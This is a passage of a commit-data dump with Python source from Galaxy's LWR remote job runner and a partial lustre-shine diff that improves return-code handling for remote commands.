metadata_kwds['config_root']=remote_galaxy_home default_config_file=os.path.join(remote_galaxy_home, 'universe_wsgi.ini') metadata_kwds['config_file']=remote_system_properties.get('galaxy_config_file', default_config_file) metadata_kwds['dataset_files_path']=remote_system_properties.get('galaxy_dataset_files_path', None) if LwrJobRunner.__use_remote_datatypes_conf( client): remote_datatypes_config=remote_system_properties.get('galaxy_datatypes_config_file', None) if not remote_datatypes_config: log.warn(NO_REMOTE_DATATYPES_CONFIG) remote_datatypes_config=os.path.join(remote_galaxy_home, 'datatypes_conf.xml') metadata_kwds['datatypes_config']=remote_datatypes_config else: integrates_datatypes_config=self.app.datatypes_registry.integrated_datatypes_configs job_wrapper.extra_filenames.append(integrates_datatypes_config) metadata_kwds['datatypes_config']=os.path.join(configs_directory, os.path.basename(integrates_datatypes_config)) return metadata_kwds class LwrComputeEnvironment( ComputeEnvironment): def __init__( self, lwr_client, job_wrapper, remote_job_config): self.lwr_client=lwr_client self.job_wrapper=job_wrapper self.local_path_config=job_wrapper.default_compute_environment() self.unstructured_path_rewrites={} self._wrapper_input_paths=self.local_path_config.input_paths() self._wrapper_output_paths=self.local_path_config.output_paths() self.path_mapper=PathMapper(lwr_client, remote_job_config, self.local_path_config.working_directory()) self._config_directory=remote_job_config[ \"configs_directory\"] self._working_directory=remote_job_config[ \"working_directory\"] self._sep=remote_job_config[ \"system_properties\"][ \"separator\"] self._tool_dir=remote_job_config[ \"tools_directory\"] version_path=self.local_path_config.version_path() new_version_path=self.path_mapper.remote_version_path_rewrite(version_path) if new_version_path: version_path=new_version_path self._version_path=version_path def output_paths( self): local_output_paths=self._wrapper_output_paths results=[] for local_output_path in local_output_paths: wrapper_path=str( local_output_path) remote_path=self.path_mapper.remote_output_path_rewrite( wrapper_path) results.append( self._dataset_path( local_output_path, remote_path)) return results def input_paths( self): local_input_paths=self._wrapper_input_paths results=[] for local_input_path in local_input_paths: wrapper_path=str( local_input_path) remote_path=self.path_mapper.remote_input_path_rewrite( wrapper_path) results.append( self._dataset_path( local_input_path, remote_path)) return results def _dataset_path( self, local_dataset_path, remote_path): remote_extra_files_path=None if remote_path: remote_extra_files_path=\"%s_files\" % remote_path[ 0:-len( \".dat\")] return local_dataset_path.with_path_for_job( remote_path, remote_extra_files_path) def working_directory( self): return self._working_directory def config_directory( self): return self._config_directory def new_file_path( self): return self.working_directory() def sep( self): return self._sep def version_path( self): return self._version_path def rewriter( self, parameter_value): unstructured_path_rewrites=self.unstructured_path_rewrites if parameter_value in unstructured_path_rewrites: return unstructured_path_rewrites[ parameter_value] if parameter_value in unstructured_path_rewrites.itervalues(): return parameter_value rewrite, new_unstructured_path_rewrites=self.path_mapper.check_for_arbitrary_rewrite( parameter_value) if rewrite: unstructured_path_rewrites.update(new_unstructured_path_rewrites) return rewrite else: return parameter_value def unstructured_path_rewriter( self): return self.rewriter ", "sourceWithComments": "import logging\n\nfrom galaxy import model\nfrom galaxy.jobs.runners import AsynchronousJobState, AsynchronousJobRunner\nfrom galaxy.jobs import ComputeEnvironment\nfrom galaxy.jobs import JobDestination\nfrom galaxy.jobs.command_factory import build_command\nfrom galaxy.tools.deps import dependencies\nfrom galaxy.util import string_as_bool_or_none\nfrom galaxy.util.bunch import Bunch\n\nimport errno\nfrom time import sleep\nimport os\n\nfrom .lwr_client import build_client_manager\nfrom .lwr_client import url_to_destination_params\nfrom .lwr_client import finish_job as lwr_finish_job\nfrom .lwr_client import submit_job as lwr_submit_job\nfrom .lwr_client import ClientJobDescription\nfrom .lwr_client import LwrOutputs\nfrom .lwr_client import ClientOutputs\nfrom .lwr_client import PathMapper\n\nlog = logging.getLogger( __name__ )\n\n__all__ = [ 'LwrJobRunner' ]\n\nNO_REMOTE_GALAXY_FOR_METADATA_MESSAGE = \"LWR misconfiguration - LWR client configured to set metadata remotely, but remote LWR isn't properly configured with a galaxy_home directory.\"\nNO_REMOTE_DATATYPES_CONFIG = \"LWR client is configured to use remote datatypes configuration when setting metadata externally, but LWR is not configured with this information. Defaulting to datatypes_conf.xml.\"\n\n# Is there a good way to infer some default for this? Can only use\n# url_for from web threads. https://gist.github.com/jmchilton/9098762\nDEFAULT_GALAXY_URL = \"http://localhost:8080\"\n\n\nclass LwrJobRunner( AsynchronousJobRunner ):\n    \"\"\"\n    LWR Job Runner\n    \"\"\"\n    runner_name = \"LWRRunner\"\n\n    def __init__( self, app, nworkers, transport=None, cache=None, url=None, galaxy_url=DEFAULT_GALAXY_URL ):\n        \"\"\"Start the job runner \"\"\"\n        super( LwrJobRunner, self ).__init__( app, nworkers )\n        self.async_status_updates = dict()\n        self._init_monitor_thread()\n        self._init_worker_threads()\n        client_manager_kwargs = {'transport_type': transport, 'cache': string_as_bool_or_none(cache), \"url\": url}\n        self.galaxy_url = galaxy_url\n        self.client_manager = build_client_manager(**client_manager_kwargs)\n\n    def url_to_destination( self, url ):\n        \"\"\"Convert a legacy URL to a job destination\"\"\"\n        return JobDestination( runner=\"lwr\", params=url_to_destination_params( url ) )\n\n    def check_watched_item(self, job_state):\n        try:\n            client = self.get_client_from_state(job_state)\n\n            if hasattr(self.client_manager, 'ensure_has_status_update_callback'):\n                # Message queue implementation.\n\n                # TODO: Very hacky now, refactor after Dannon merges in his\n                # message queue work, runners need the ability to disable\n                # check_watched_item like this and instead a callback needs to\n                # be issued post job recovery allowing a message queue\n                # consumer to be setup.\n                self.client_manager.ensure_has_status_update_callback(self.__async_update)\n                return job_state\n\n            status = client.get_status()\n        except Exception:\n            # An orphaned job was put into the queue at app startup, so remote server went down\n            # either way we are done I guess.\n            self.mark_as_finished(job_state)\n            return None\n        job_state = self.__update_job_state_for_lwr_status(job_state, status)\n        return job_state\n\n    def __update_job_state_for_lwr_status(self, job_state, lwr_status):\n        if lwr_status == \"complete\":\n            self.mark_as_finished(job_state)\n            return None\n        if lwr_status == \"running\" and not job_state.running:\n            job_state.running = True\n            job_state.job_wrapper.change_state( model.Job.states.RUNNING )\n        return job_state\n\n    def __async_update( self, full_status ):\n        job_id = full_status[ \"job_id\" ]\n        job_state = self.__find_watched_job( job_id )\n        if not job_state:\n            # Probably finished too quickly, sleep and try again.\n            # Kind of a hack, why does monitor queue need to no wait\n            # get and sleep instead of doing a busy wait that would\n            # respond immediately.\n            sleep( 2 )\n            job_state = self.__find_watched_job( job_id )\n        if not job_state:\n            log.warn( \"Failed to find job corresponding to final status %s in %s\" % ( full_status, self.watched ) )\n        else:\n            self.__update_job_state_for_lwr_status(job_state, full_status[\"status\"])\n\n    def __find_watched_job( self, job_id ):\n        found_job = None\n        for async_job_state in self.watched:\n            if str( async_job_state.job_id ) == job_id:\n                found_job = async_job_state\n                break\n        return found_job\n\n    def queue_job(self, job_wrapper):\n        job_destination = job_wrapper.job_destination\n\n        command_line, client, remote_job_config, compute_environment = self.__prepare_job( job_wrapper, job_destination )\n\n        if not command_line:\n            return\n\n        try:\n            dependencies_description = LwrJobRunner.__dependencies_description( client, job_wrapper )\n            rewrite_paths = not LwrJobRunner.__rewrite_parameters( client )\n            unstructured_path_rewrites = {}\n            if compute_environment:\n                unstructured_path_rewrites = compute_environment.unstructured_path_rewrites\n\n            client_job_description = ClientJobDescription(\n                command_line=command_line,\n                input_files=self.get_input_files(job_wrapper),\n                client_outputs=self.__client_outputs(client, job_wrapper),\n                working_directory=job_wrapper.working_directory,\n                tool=job_wrapper.tool,\n                config_files=job_wrapper.extra_filenames,\n                dependencies_description=dependencies_description,\n                env=client.env,\n                rewrite_paths=rewrite_paths,\n                arbitrary_files=unstructured_path_rewrites,\n            )\n            job_id = lwr_submit_job(client, client_job_description, remote_job_config)\n            log.info(\"lwr job submitted with job_id %s\" % job_id)\n            job_wrapper.set_job_destination( job_destination, job_id )\n            job_wrapper.change_state( model.Job.states.QUEUED )\n        except Exception:\n            job_wrapper.fail( \"failure running job\", exception=True )\n            log.exception(\"failure running job %d\" % job_wrapper.job_id)\n            return\n\n        lwr_job_state = AsynchronousJobState()\n        lwr_job_state.job_wrapper = job_wrapper\n        lwr_job_state.job_id = job_id\n        lwr_job_state.old_state = True\n        lwr_job_state.running = False\n        lwr_job_state.job_destination = job_destination\n        self.monitor_job(lwr_job_state)\n\n    def __prepare_job(self, job_wrapper, job_destination):\n        \"\"\" Build command-line and LWR client for this job. \"\"\"\n        command_line = None\n        client = None\n        remote_job_config = None\n        compute_environment = None\n        try:\n            client = self.get_client_from_wrapper(job_wrapper)\n            tool = job_wrapper.tool\n            remote_job_config = client.setup(tool.id, tool.version)\n            rewrite_parameters = LwrJobRunner.__rewrite_parameters( client )\n            prepare_kwds = {}\n            if rewrite_parameters:\n                compute_environment = LwrComputeEnvironment( client, job_wrapper, remote_job_config )\n                prepare_kwds[ 'compute_environment' ] = compute_environment\n            job_wrapper.prepare( **prepare_kwds )\n            self.__prepare_input_files_locally(job_wrapper)\n            remote_metadata = LwrJobRunner.__remote_metadata( client )\n            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n            dependency_resolution = LwrJobRunner.__dependency_resolution( client )\n            metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)\n            remote_command_params = dict(\n                working_directory=remote_job_config['working_directory'],\n                metadata_kwds=metadata_kwds,\n                dependency_resolution=dependency_resolution,\n            )\n            command_line = build_command(\n                self,\n                job_wrapper=job_wrapper,\n                include_metadata=remote_metadata,\n                include_work_dir_outputs=remote_work_dir_copy,\n                remote_command_params=remote_command_params,\n            )\n        except Exception:\n            job_wrapper.fail( \"failure preparing job\", exception=True )\n            log.exception(\"failure running job %d\" % job_wrapper.job_id)\n\n        # If we were able to get a command line, run the job\n        if not command_line:\n            job_wrapper.finish( '', '' )\n\n        return command_line, client, remote_job_config, compute_environment\n\n    def __prepare_input_files_locally(self, job_wrapper):\n        \"\"\"Run task splitting commands locally.\"\"\"\n        prepare_input_files_cmds = getattr(job_wrapper, 'prepare_input_files_cmds', None)\n        if prepare_input_files_cmds is not None:\n            for cmd in prepare_input_files_cmds:  # run the commands to stage the input files\n                if 0 != os.system(cmd):\n                    raise Exception('Error running file staging command: %s' % cmd)\n            job_wrapper.prepare_input_files_cmds = None  # prevent them from being used in-line\n\n    def get_output_files(self, job_wrapper):\n        output_paths = job_wrapper.get_output_fnames()\n        return [ str( o ) for o in output_paths ]   # Force job_path from DatasetPath objects.\n\n    def get_input_files(self, job_wrapper):\n        input_paths = job_wrapper.get_input_paths()\n        return [ str( i ) for i in input_paths ]  # Force job_path from DatasetPath objects.\n\n    def get_client_from_wrapper(self, job_wrapper):\n        job_id = job_wrapper.job_id\n        if hasattr(job_wrapper, 'task_id'):\n            job_id = \"%s_%s\" % (job_id, job_wrapper.task_id)\n        params = job_wrapper.job_destination.params.copy()\n        for key, value in params.iteritems():\n            if value:\n                params[key] = model.User.expand_user_properties( job_wrapper.get_job().user, value )\n        env = getattr( job_wrapper.job_destination, \"env\", [] )\n        return self.get_client( params, job_id, env )\n\n    def get_client_from_state(self, job_state):\n        job_destination_params = job_state.job_destination.params\n        job_id = job_state.job_id\n        return self.get_client( job_destination_params, job_id )\n\n    def get_client( self, job_destination_params, job_id, env=[] ):\n        # Cannot use url_for outside of web thread.\n        #files_endpoint = url_for( controller=\"job_files\", job_id=encoded_job_id )\n\n        encoded_job_id = self.app.security.encode_id(job_id)\n        job_key = self.app.security.encode_id( job_id, kind=\"jobs_files\" )\n        files_endpoint = \"%s/api/jobs/%s/files?job_key=%s\" % (\n            self.galaxy_url,\n            encoded_job_id,\n            job_key\n        )\n        get_client_kwds = dict(\n            job_id=str( job_id ),\n            files_endpoint=files_endpoint,\n            env=env\n        )\n        return self.client_manager.get_client( job_destination_params, **get_client_kwds )\n\n    def finish_job( self, job_state ):\n        stderr = stdout = ''\n        job_wrapper = job_state.job_wrapper\n        try:\n            client = self.get_client_from_state(job_state)\n            run_results = client.full_status()\n\n            stdout = run_results.get('stdout', '')\n            stderr = run_results.get('stderr', '')\n            exit_code = run_results.get('returncode', None)\n            lwr_outputs = LwrOutputs.from_status_response(run_results)\n            # Use LWR client code to transfer/copy files back\n            # and cleanup job if needed.\n            completed_normally = \\\n                job_wrapper.get_state() not in [ model.Job.states.ERROR, model.Job.states.DELETED ]\n            cleanup_job = self.app.config.cleanup_job\n            client_outputs = self.__client_outputs(client, job_wrapper)\n            finish_args = dict( client=client,\n                                job_completed_normally=completed_normally,\n                                cleanup_job=cleanup_job,\n                                client_outputs=client_outputs,\n                                lwr_outputs=lwr_outputs )\n            failed = lwr_finish_job( **finish_args )\n\n            if failed:\n                job_wrapper.fail(\"Failed to find or download one or more job outputs from remote server.\", exception=True)\n        except Exception:\n            message = \"Failed to communicate with remote job server.\"\n            job_wrapper.fail( message, exception=True )\n            log.exception(\"failure finishing job %d\" % job_wrapper.job_id)\n            return\n        if not LwrJobRunner.__remote_metadata( client ):\n            self._handle_metadata_externally( job_wrapper, resolve_requirements=True )\n        # Finish the job\n        try:\n            job_wrapper.finish( stdout, stderr, exit_code )\n        except Exception:\n            log.exception(\"Job wrapper finish method failed\")\n            job_wrapper.fail(\"Unable to finish job\", exception=True)\n\n    def fail_job( self, job_state ):\n        \"\"\"\n        Seperated out so we can use the worker threads for it.\n        \"\"\"\n        self.stop_job( self.sa_session.query( self.app.model.Job ).get( job_state.job_wrapper.job_id ) )\n        job_state.job_wrapper.fail( job_state.fail_message )\n\n    def check_pid( self, pid ):\n        try:\n            os.kill( pid, 0 )\n            return True\n        except OSError, e:\n            if e.errno == errno.ESRCH:\n                log.debug( \"check_pid(): PID %d is dead\" % pid )\n            else:\n                log.warning( \"check_pid(): Got errno %s when attempting to check PID %d: %s\" % ( errno.errorcode[e.errno], pid, e.strerror ) )\n            return False\n\n    def stop_job( self, job ):\n        #if our local job has JobExternalOutputMetadata associated, then our primary job has to have already finished\n        job_ext_output_metadata = job.get_external_output_metadata()\n        if job_ext_output_metadata:\n            pid = job_ext_output_metadata[0].job_runner_external_pid  # every JobExternalOutputMetadata has a pid set, we just need to take from one of them\n            if pid in [ None, '' ]:\n                log.warning( \"stop_job(): %s: no PID in database for job, unable to stop\" % job.id )\n                return\n            pid = int( pid )\n            if not self.check_pid( pid ):\n                log.warning( \"stop_job(): %s: PID %d was already dead or can't be signaled\" % ( job.id, pid ) )\n                return\n            for sig in [ 15, 9 ]:\n                try:\n                    os.killpg( pid, sig )\n                except OSError, e:\n                    log.warning( \"stop_job(): %s: Got errno %s when attempting to signal %d to PID %d: %s\" % ( job.id, errno.errorcode[e.errno], sig, pid, e.strerror ) )\n                    return  # give up\n                sleep( 2 )\n                if not self.check_pid( pid ):\n                    log.debug( \"stop_job(): %s: PID %d successfully killed with signal %d\" % ( job.id, pid, sig ) )\n                    return\n                else:\n                    log.warning( \"stop_job(): %s: PID %d refuses to die after signaling TERM/KILL\" % ( job.id, pid ) )\n        else:\n            # Remote kill\n            lwr_url = job.job_runner_name\n            job_id = job.job_runner_external_id\n            log.debug(\"Attempt remote lwr kill of job with url %s and id %s\" % (lwr_url, job_id))\n            client = self.get_client(job.destination_params, job_id)\n            client.kill()\n\n    def recover( self, job, job_wrapper ):\n        \"\"\"Recovers jobs stuck in the queued/running state when Galaxy started\"\"\"\n        job_state = AsynchronousJobState()\n        job_state.job_id = str( job.get_job_runner_external_id() )\n        job_state.runner_url = job_wrapper.get_job_runner_url()\n        job_state.job_destination = job_wrapper.job_destination\n        job_wrapper.command_line = job.get_command_line()\n        job_state.job_wrapper = job_wrapper\n        state = job.get_state()\n        if state in [model.Job.states.RUNNING, model.Job.states.QUEUED]:\n            log.debug( \"(LWR/%s) is still in running state, adding to the LWR queue\" % ( job.get_id()) )\n            job_state.old_state = True\n            job_state.running = state == model.Job.states.RUNNING\n            self.monitor_queue.put( job_state )\n\n    def shutdown( self ):\n        super( LwrJobRunner, self ).shutdown()\n        self.client_manager.shutdown()\n\n    def __client_outputs( self, client, job_wrapper ):\n        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n        if not remote_work_dir_copy:\n            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n        else:\n            # They have already been copied over to look like regular outputs remotely,\n            # no need to handle them differently here.\n            work_dir_outputs = []\n        output_files = self.get_output_files( job_wrapper )\n        client_outputs = ClientOutputs(\n            working_directory=job_wrapper.working_directory,\n            work_dir_outputs=work_dir_outputs,\n            output_files=output_files,\n            version_file=job_wrapper.get_version_string_path(),\n        )\n        return client_outputs\n\n    @staticmethod\n    def __dependencies_description( lwr_client, job_wrapper ):\n        dependency_resolution = LwrJobRunner.__dependency_resolution( lwr_client )\n        remote_dependency_resolution = dependency_resolution == \"remote\"\n        if not remote_dependency_resolution:\n            return None\n        requirements = job_wrapper.tool.requirements or []\n        installed_tool_dependencies = job_wrapper.tool.installed_tool_dependencies or []\n        return dependencies.DependenciesDescription(\n            requirements=requirements,\n            installed_tool_dependencies=installed_tool_dependencies,\n        )\n\n    @staticmethod\n    def __dependency_resolution( lwr_client ):\n        dependency_resolution = lwr_client.destination_params.get( \"dependency_resolution\", \"local\" )\n        if dependency_resolution not in [\"none\", \"local\", \"remote\"]:\n            raise Exception(\"Unknown dependency_resolution value encountered %s\" % dependency_resolution)\n        return dependency_resolution\n\n    @staticmethod\n    def __remote_metadata( lwr_client ):\n        remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False ) )\n        return remote_metadata\n\n    @staticmethod\n    def __remote_work_dir_copy( lwr_client ):\n        # Right now remote metadata handling assumes from_work_dir outputs\n        # have been copied over before it runs. So do that remotely. This is\n        # not the default though because adding it to the command line is not\n        # cross-platform (no cp on Windows) and it's un-needed work outside\n        # the context of metadata settting (just as easy to download from\n        # either place.)\n        return LwrJobRunner.__remote_metadata( lwr_client )\n\n    @staticmethod\n    def __use_remote_datatypes_conf( lwr_client ):\n        \"\"\" When setting remote metadata, use integrated datatypes from this\n        Galaxy instance or use the datatypes config configured via the remote\n        LWR.\n\n        Both options are broken in different ways for same reason - datatypes\n        may not match. One can push the local datatypes config to the remote\n        server - but there is no guarentee these datatypes will be defined\n        there. Alternatively, one can use the remote datatype config - but\n        there is no guarentee that it will contain all the datatypes available\n        to this Galaxy.\n        \"\"\"\n        use_remote_datatypes = string_as_bool_or_none( lwr_client.destination_params.get( \"use_remote_datatypes\", False ) )\n        return use_remote_datatypes\n\n    @staticmethod\n    def __rewrite_parameters( lwr_client ):\n        return string_as_bool_or_none( lwr_client.destination_params.get( \"rewrite_parameters\", False ) ) or False\n\n    def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, remote_job_config):\n        metadata_kwds = {}\n        if remote_metadata:\n            remote_system_properties = remote_job_config.get(\"system_properties\", {})\n            remote_galaxy_home = remote_system_properties.get(\"galaxy_home\", None)\n            if not remote_galaxy_home:\n                raise Exception(NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE)\n            metadata_kwds['exec_dir'] = remote_galaxy_home\n            outputs_directory = remote_job_config['outputs_directory']\n            configs_directory = remote_job_config['configs_directory']\n            working_directory = remote_job_config['working_directory']\n            outputs = [Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)]\n            metadata_kwds['output_fnames'] = outputs\n            metadata_kwds['compute_tmp_dir'] = working_directory\n            metadata_kwds['config_root'] = remote_galaxy_home\n            default_config_file = os.path.join(remote_galaxy_home, 'universe_wsgi.ini')\n            metadata_kwds['config_file'] = remote_system_properties.get('galaxy_config_file', default_config_file)\n            metadata_kwds['dataset_files_path'] = remote_system_properties.get('galaxy_dataset_files_path', None)\n            if LwrJobRunner.__use_remote_datatypes_conf( client ):\n                remote_datatypes_config = remote_system_properties.get('galaxy_datatypes_config_file', None)\n                if not remote_datatypes_config:\n                    log.warn(NO_REMOTE_DATATYPES_CONFIG)\n                    remote_datatypes_config = os.path.join(remote_galaxy_home, 'datatypes_conf.xml')\n                metadata_kwds['datatypes_config'] = remote_datatypes_config\n            else:\n                integrates_datatypes_config = self.app.datatypes_registry.integrated_datatypes_configs\n                # Ensure this file gets pushed out to the remote config dir.\n                job_wrapper.extra_filenames.append(integrates_datatypes_config)\n\n                metadata_kwds['datatypes_config'] = os.path.join(configs_directory, os.path.basename(integrates_datatypes_config))\n        return metadata_kwds\n\n\nclass LwrComputeEnvironment( ComputeEnvironment ):\n\n    def __init__( self, lwr_client, job_wrapper, remote_job_config ):\n        self.lwr_client = lwr_client\n        self.job_wrapper = job_wrapper\n        self.local_path_config = job_wrapper.default_compute_environment()\n        self.unstructured_path_rewrites = {}\n        # job_wrapper.prepare is going to expunge the job backing the following\n        # computations, so precalculate these paths.\n        self._wrapper_input_paths = self.local_path_config.input_paths()\n        self._wrapper_output_paths = self.local_path_config.output_paths()\n        self.path_mapper = PathMapper(lwr_client, remote_job_config, self.local_path_config.working_directory())\n        self._config_directory = remote_job_config[ \"configs_directory\" ]\n        self._working_directory = remote_job_config[ \"working_directory\" ]\n        self._sep = remote_job_config[ \"system_properties\" ][ \"separator\" ]\n        self._tool_dir = remote_job_config[ \"tools_directory\" ]\n        version_path = self.local_path_config.version_path()\n        new_version_path = self.path_mapper.remote_version_path_rewrite(version_path)\n        if new_version_path:\n            version_path = new_version_path\n        self._version_path = version_path\n\n    def output_paths( self ):\n        local_output_paths = self._wrapper_output_paths\n\n        results = []\n        for local_output_path in local_output_paths:\n            wrapper_path = str( local_output_path )\n            remote_path = self.path_mapper.remote_output_path_rewrite( wrapper_path )\n            results.append( self._dataset_path( local_output_path, remote_path ) )\n        return results\n\n    def input_paths( self ):\n        local_input_paths = self._wrapper_input_paths\n\n        results = []\n        for local_input_path in local_input_paths:\n            wrapper_path = str( local_input_path )\n            # This will over-copy in some cases. For instance in the case of task\n            # splitting, this input will be copied even though only the work dir\n            # input will actually be used.\n            remote_path = self.path_mapper.remote_input_path_rewrite( wrapper_path )\n            results.append( self._dataset_path( local_input_path, remote_path ) )\n        return results\n\n    def _dataset_path( self, local_dataset_path, remote_path ):\n        remote_extra_files_path = None\n        if remote_path:\n            remote_extra_files_path = \"%s_files\" % remote_path[ 0:-len( \".dat\" ) ]\n        return local_dataset_path.with_path_for_job( remote_path, remote_extra_files_path )\n\n    def working_directory( self ):\n        return self._working_directory\n\n    def config_directory( self ):\n        return self._config_directory\n\n    def new_file_path( self ):\n        return self.working_directory()  # Problems with doing this?\n\n    def sep( self ):\n        return self._sep\n\n    def version_path( self ):\n        return self._version_path\n\n    def rewriter( self, parameter_value ):\n        unstructured_path_rewrites = self.unstructured_path_rewrites\n        if parameter_value in unstructured_path_rewrites:\n            # Path previously mapped, use previous mapping.\n            return unstructured_path_rewrites[ parameter_value ]\n        if parameter_value in unstructured_path_rewrites.itervalues():\n            # Path is a rewritten remote path (this might never occur,\n            # consider dropping check...)\n            return parameter_value\n\n        rewrite, new_unstructured_path_rewrites = self.path_mapper.check_for_arbitrary_rewrite( parameter_value )\n        if rewrite:\n            unstructured_path_rewrites.update(new_unstructured_path_rewrites)\n            return rewrite\n        else:\n            # Did need to rewrite, use original path or value.\n            return parameter_value\n\n    def unstructured_path_rewriter( self ):\n        return self.rewriter\n"}}, "msg": "Optimize/correct LWR remote metadata generation for working directory outputs.\nPreviously I was attempting to mimic Galaxy's behavior of copying these files to a fixed output location after execution on the remote server before setting metadata. This was an un-needed copy since it appears to easier to just send the metadata generation code the expected path on the working directory.\n\n\nFormer-commit-id: fab9906d2cea455ef81150c999a809d01a2edcab"}}, "https://github.com/kcgthb/lustre-shine": {"7ff203be36e439b535894764c37a8446351627ec": {"url": "https://api.github.com/repos/kcgthb/lustre-shine/commits/7ff203be36e439b535894764c37a8446351627ec", "html_url": "https://github.com/kcgthb/lustre-shine/commit/7ff203be36e439b535894764c37a8446351627ec", "message": "* improved proxy (remote) commands execution error handling, now checking for every error != 0 to catch every possible remote errors\n    * modified return codes when run with -R (remote call) by adding a filter for each command (rc=0 proxy success, rc!=0 proxy failure)\n    * misc. improvements on error handling and return codes handling\n* added mount/umount user messages\n\nSVN commit: r109", "sha": "7ff203be36e439b535894764c37a8446351627ec", "keyword": "remote code execution improve", "diff": "diff --git a/lib/Shine/Commands/Base/Command.py b/lib/Shine/Commands/Base/Command.py\nindex db0fa19..4b097fa 100644\n--- a/lib/Shine/Commands/Base/Command.py\n+++ b/lib/Shine/Commands/Base/Command.py\n@@ -135,3 +135,12 @@ def ask_confirm(self, prompt):\n         \"\"\"\n         i = raw_input(\"%s (y)es/(N)o: \" % prompt)\n         return i == 'y' or i == 'Y'\n+\n+\n+    def filter_rc(self, rc):\n+        \"\"\"\n+        Allow derived classes to filter return codes.\n+        \"\"\"\n+        # default is to not filter return code\n+        return rc\n+\ndiff --git a/lib/Shine/Commands/Base/RemoteCommand.py b/lib/Shine/Commands/Base/RemoteCommand.py\nindex 77de3e9..aeeea8c 100644\n--- a/lib/Shine/Commands/Base/RemoteCommand.py\n+++ b/lib/Shine/Commands/Base/RemoteCommand.py\n@@ -23,6 +23,7 @@\n from Shine.Configuration.Globals import Globals \n from Shine.Configuration.Exceptions import *\n from Command import Command\n+from CommandRCDefs import *\n from RemoteCallEventHandler import RemoteCallEventHandler\n from Support.Nodes import Nodes\n from Support.Yes import Yes\n@@ -85,6 +86,18 @@ def ask_confirm(self, prompt):\n         \"\"\"\n         return self.remote_call or Command.ask_confirm(self, prompt)\n \n+    def filter_rc(self, rc):\n+        \"\"\"\n+        When called remotely, return code are not used to handle shine action\n+        success or failure, nor for status info. To properly detect ssh or remote\n+        shine installation failures, we filter the return code here.\n+        \"\"\"\n+        if self.remote_call:\n+            # Only errors of type RUNTIME ERROR are allowed to go up.\n+            rc &= RC_FLAG_RUNTIME_ERROR\n+\n+        return Command.filter_rc(self, rc)\n+\n \n class RemoteCriticalCommand(RemoteCommand):\n \ndiff --git a/lib/Shine/Commands/CommandRegistry.py b/lib/Shine/Commands/CommandRegistry.py\nindex f1ae724..8edf6e7 100644\n--- a/lib/Shine/Commands/CommandRegistry.py\n+++ b/lib/Shine/Commands/CommandRegistry.py\n@@ -120,5 +120,8 @@ def execute(self, args):\n         command.parse(new_args)\n \n         # Execute\n-        return command.execute()\n+        rc = command.execute()\n+\n+        # Filter rc\n+        return command.filter_rc(rc)\n \ndiff --git a/lib/Shine/Commands/Install.py b/lib/Shine/Commands/Install.py\nindex 525cfc6..9bc0dd8 100644\n--- a/lib/Shine/Commands/Install.py\n+++ b/lib/Shine/Commands/Install.py\n@@ -25,9 +25,11 @@\n from Shine.FSUtils import create_lustrefs\n \n from Base.Command import Command\n+from Base.CommandRCDefs import *\n from Base.Support.LMF import LMF\n from Base.Support.Nodes import Nodes\n \n+from Exceptions import *\n \n class Install(Command):\n     \"\"\"\n@@ -48,7 +50,7 @@ def get_desc(self):\n \n     def execute(self):\n         if not self.opt_m:\n-            print \"Bad argument\"\n+            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)\n         else:\n             # Use this Shine.FSUtils convenience function.\n             fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n@@ -83,5 +85,5 @@ def execute(self):\n                 print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                         fs_conf.get_fs_name()\n \n-            return 0\n+            return RC_OK\n \ndiff --git a/lib/Shine/Commands/Mount.py b/lib/Shine/Commands/Mount.py\nindex 43f3a91..d705f8f 100644\n--- a/lib/Shine/Commands/Mount.py\n+++ b/lib/Shine/Commands/Mount.py\n@@ -59,7 +59,7 @@ def ev_startclient_start(self, node, client):\n     def ev_startclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Mount: %s\" % (node, client.status_info)\n+                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully mounted on %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n@@ -126,17 +126,26 @@ def execute(self):\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.mount(mount_options=fs_conf.get_mount_options())\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n                 result = rc\n \n-            if rc == RC_OK:\n-                if vlevel > 0:\n-                    print \"Mount successful.\"\n-            elif rc == RC_RUNTIME_ERROR:\n-                for nodes, msg in fs.proxy_errors:\n-                    print \"%s: %s\" % (nodes, msg)\n+            if not self.remote_call:\n+                if rc == RC_OK:\n+                    if vlevel > 0:\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                        print \"Mount successful on %s\" % m_nodes\n+                elif rc == RC_RUNTIME_ERROR:\n+                    for nodes, msg in fs.proxy_errors:\n+                        print \"%s: %s\" % (nodes, msg)\n \n         return result\n \ndiff --git a/lib/Shine/Commands/Preinstall.py b/lib/Shine/Commands/Preinstall.py\nindex 304eb30..6baf18c 100644\n--- a/lib/Shine/Commands/Preinstall.py\n+++ b/lib/Shine/Commands/Preinstall.py\n@@ -26,6 +26,7 @@\n from Shine.FSUtils import create_lustrefs\n \n from Base.RemoteCommand import RemoteCommand\n+from Base.CommandRCDefs import *\n from Base.Support.FS import FS\n \n import os\n@@ -54,6 +55,7 @@ def execute(self):\n             if not os.path.exists(conf_dir_path):\n                 os.makedirs(conf_dir_path, 0755)\n         except OSError, ex:\n-            print \"OSError\"\n-            raise\n+            print \"OSError %s\" % ex\n+            return RC_RUNTIME_ERROR\n \n+        return RC_OK\ndiff --git a/lib/Shine/Commands/Start.py b/lib/Shine/Commands/Start.py\nindex e29a7e3..63c85d6 100644\n--- 